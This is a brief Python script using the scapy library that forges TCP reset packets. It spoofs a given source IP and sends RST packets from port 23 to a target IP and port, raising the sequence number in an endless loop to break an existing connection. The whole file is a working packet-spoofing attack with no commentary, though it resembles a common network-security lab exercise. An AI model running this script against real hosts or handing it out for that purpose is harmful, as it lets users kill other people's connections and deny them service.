import os
import sys
from scapy.all import *

def tcp_rst(i):
	source_ip=sys.argv[1]
	dest_ip=sys.argv[2]
	
	dest_port=int(sys.argv[3])
	seq_no=int(sys.argv[4])+i
	
	send_tcp_rst_packet(source_ip,dest_ip,dest_port,seq_no)



def send_tcp_rst_packet(src_ip,dest_ip,dest_port,seq_no):
	ip_header= IP(src=src_ip,dst=dest_ip)
	tcp_header= TCP(flags="R",sport=23,dport=dest_port,seq=seq_no)

	packet= ip_header/tcp_header

	send(packet) 

	print "Sending packet---> seq. no. "+ str(seq_no) +" and port no. " +str(dest_port)


i=0
while True:
	tcp_rst(i)
	i=i+1
